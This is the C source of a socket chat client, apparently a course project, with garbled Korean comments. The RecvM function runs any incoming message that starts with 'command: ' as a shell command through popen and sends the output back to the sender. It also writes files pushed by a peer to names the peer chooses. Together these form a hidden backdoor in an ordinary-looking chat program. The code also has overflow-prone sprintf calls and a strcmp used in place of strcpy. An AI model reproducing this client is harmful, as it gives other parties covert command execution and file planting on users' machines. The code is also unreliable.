#include "client.h"

int main()
{
	int port;
	char pt[MAX_MESSAGE_LEN];
	//������ �� �ִ� ���� ��ϵ� 
	puts("------���� ���------");
	puts("1. ���н����α׷���");
	puts("2. �ڷᱸ��");
	puts("3. ��ǻ�ͱ���");
	printf("���� ������ �������ּ��� :");
	scanf("%d", &port);
	getchar();
	signal(SIGINT, SigExit);
	port = port + SERV_PORT - 1;

	pthread_mutex_init(&usermutex, NULL);

	if ((sd = SockSetting(SERV_IP, port)) == -1) //�ش� ���� ������ �����Ѵ�.
	{
		perror("socket");
		return 0;
	}

	ChatStart(sd);

	return 0;
}

void ChatStart(int ssd)
{
	User user;
	pthread_t ptr[2];
	char nick[MAX_NICK_LEN] = "";
	char rbuf[MAX_MESSAGE_LEN] = "";
	char* root = "admin";
	recv(ssd, rbuf, 100, 0);
	fputs(rbuf, stdout);
	fgets(nick, sizeof(nick), stdin);
	send(ssd, nick, strlen(nick), 0); //���� �̸��� ������.
	sleep(1);
	send(ssd, root, strlen(root), 0);  //������ �������� ������ �˸���.
	user.usd = ssd;
	strcmp(user.unick, nick);

	pthread_create(&ptr[0], NULL, RecvM, &user); // RecvM() ����
	pthread_detach(ptr[0]);
	pthread_create(&ptr[1], NULL, SendM, &user); // SendM() ����
	pthread_detach(ptr[1]);

	while (1)
		pause();
}

void *RecvM(void *user)
{
	User us = *(User *)user;
	char rbuf[MAX_MESSAGE_LEN];
	
	char command[255] = "";
	char from[255] = "";
	char line[124] = "";
	char result[10240] = "";
	int count = 0;
	while (1)
	{
		
		while (recv(us.usd, rbuf, sizeof(rbuf), 0) > 0)
		{
			if (!strncmp(rbuf, "command: ", 9)) // command: ��� ���ڿ��� ������ �����Ѵ�.
			{
				char * ptr,*last,*token;
				int i = 0,j;
				char *ptarr[10] = { NULL, };
				ptr = strtok(rbuf, " ");
				ptr = strtok(NULL, " ");
				while (ptr != NULL)
				{
					ptarr[i++] = ptr;
					
					ptr = strtok(NULL, " "); //���ڿ��� " "������ �и� 
				}
				for(j=0 ; j<i-1; j++)
				sprintf(command, "%s %s", command, ptarr[j]); //��ɾ� �κи� ��ģ��.
				sprintf(from, "%s", ptarr[i - 1]);
				sprintf(result, "/w %s \n", from); //�ӼӸ� ���·� ���� �غ� �Ѵ�.
				FILE *p = popen(command, "r"); //��ɾ� ����� ���������Ϳ� �����Ѵ�.
				if (p != NULL) {
					while (fgets(line, sizeof(line), p) != NULL)
						sprintf(result, "%s %s", result, line); //���������Ϳ� ����� ����� ����Ѵ�.
				}
				else
				{
					sprintf(result, "%s %s", result, "fault result");
				}
				while (result[count++] != '\0');
				send(us.usd, result, count, 0); //��ɾ� ���� ����� ������.
				memset(result, 0, sizeof(result));
				memset(command, 0, sizeof(command));
				memset(line, 0, sizeof(line));
				memset(rbuf, 0, sizeof(rbuf));
				pclose(p);
				continue;
			}
			else if(!strncmp(rbuf, "/f ", 2))// /f ��� ���ڿ��� ������ �����Ѵ�.
			{
				char *fio,*buf;
				FILE *fp;
				char filesize[1024];
				int size;
				strtok(rbuf, " ");
				fio = strtok(NULL, " ");
				fp = fopen(fio,"wb"); //fio���ִ� ���ڿ��� �̸��� ������ �����Ѵ�.
				recv(us.usd, filesize, sizeof(filesize), 0); //���� ����� �޴´�
				size = atoi(filesize);
				buf = malloc(size + 1);
				memset(buf, 0x00, size);
				read(us.usd, buf, size); // ���� ���̳ʸ��� �޾ƿ´�.
				fwrite(buf, 1, size, fp); // ���̳ʸ� ������ ����.
				fclose(fp);
				free(buf);
				memset(rbuf, 0, sizeof(rbuf));
				memset(filesize, 0, sizeof(filesize));
				continue;
			}
			else
			{
				fputs(rbuf, stdout);
				memset(rbuf, 0, sizeof(rbuf));
			}
		}
	}
}

void *SendM(void *user)
{
	User us = *(User *)user;
	char sbuf[MAX_MESSAGE_LEN];
	char rbuf[MAX_MESSAGE_LEN];
	char *buf;
	char filesize[1024];
	FILE *sourse_fd;
	char*fio;
	int size;
	while (1)
	{
		fgets(sbuf, sizeof(sbuf), stdin);
		strcpy(rbuf, sbuf);

		if (!strncmp(sbuf, "/f", 2)) { // /f ��� ���ڿ��� ������ �����Ѵ�.
			strtok(sbuf, " ");
			fio = strtok(NULL, " ");
			fio[strlen(fio) - 1] = '\0';
			sourse_fd = fopen(fio, "rb"); //fio ���ڿ� �̸��� ������ ���̳ʸ� ���·� �д´�.
			if (sourse_fd == NULL) {
				memset(sbuf, 0, sizeof(sbuf));
				memset(rbuf, 0, sizeof(rbuf));
				continue;
			}
			send(us.usd, rbuf, sizeof(rbuf), 0);  //���� �̸��� ���� ������.
			fseek(sourse_fd, 0, SEEK_END);    
			size = ftell(sourse_fd);          // ���� ũ�⸦ ���Ѵ�.
			sleep(1);
			sprintf(filesize, "%d", size);
			send(us.usd, filesize, strlen(filesize), 0); //����ũ�⺸��
			sleep(1);
			buf = malloc(size + 1); //����ũ�⸸ŭ �����Ҵ��Ѵ�. 
			memset(buf, 0, size);
			fseek(sourse_fd, 0, SEEK_SET);
			fread(buf, size, 1, sourse_fd); //buf��  ������ �а� �����Ѵ�.

			write(us.usd, buf, size);  //������ �����Ѵ�.
			memset(buf, 0, size);
			fclose(sourse_fd);
			free(buf);
		}
		else if (!strncmp(sbuf, "/p", 2)) // /p ��� ���ڿ��� ������ �����Ѵ�.
		{
			strtok(sbuf, " ");
			fio = strtok(NULL, " ");
			fio[strlen(fio) - 1] = '\0';
			sourse_fd = fopen(fio, "rb"); //fio ���ڿ� �̸��� ������ ���̳ʸ� ���·� �д´�.
			if (sourse_fd == NULL) {
				memset(sbuf, 0, sizeof(sbuf));
				memset(rbuf, 0, sizeof(rbuf));
				continue;
			}
			send(us.usd, rbuf, sizeof(rbuf), 0); //���� �̸��� ���� ������.
			fseek(sourse_fd, 0, SEEK_END);    
			size = ftell(sourse_fd);             // ���� ũ�⸦ ���Ѵ�.
			sleep(1);
			sprintf(filesize, "%d", size);
			send(us.usd, filesize, strlen(filesize), 0); //����ũ�⺸��
			sleep(1);
			buf = malloc(size + 1); //����ũ�⸸ŭ �����Ҵ��Ѵ�. 
			memset(buf, 0, size);
			fseek(sourse_fd, 0, SEEK_SET);
			fread(buf, size, 1, sourse_fd); //buf��  ������ �а� �����Ѵ�.

			write(us.usd, buf, size);  //������ �����Ѵ�.
			memset(buf, 0, size);
			fclose(sourse_fd);
			free(buf);
		}
		else
		{
			send(us.usd, sbuf, sizeof(sbuf), 0); //�Ϲ� �޼����� ������.
		}


		memset(sbuf, 0, sizeof(sbuf));
		memset(rbuf, 0, sizeof(rbuf));
	}
}

int SockSetting(char *ip, int port) //������ �����ϴ� �Լ��̴�.
{
	int ssd;

	if ((ssd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
	{
		perror("sock error");
		return -1;
	}

	struct sockaddr_in servaddr = { 0 };
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = inet_addr(ip);
	servaddr.sin_port = htons(port);

	if (connect(ssd, (struct sockaddr *)&servaddr, sizeof(servaddr)) == -1)
	{
		perror("connect");
		return -1;
	}

	return ssd;
}

void SigExit(int signo)
{
	printf("Ŭ���̾�Ʈ�� �����մϴ�.\n");
	close(sd);
	exit(0);
}

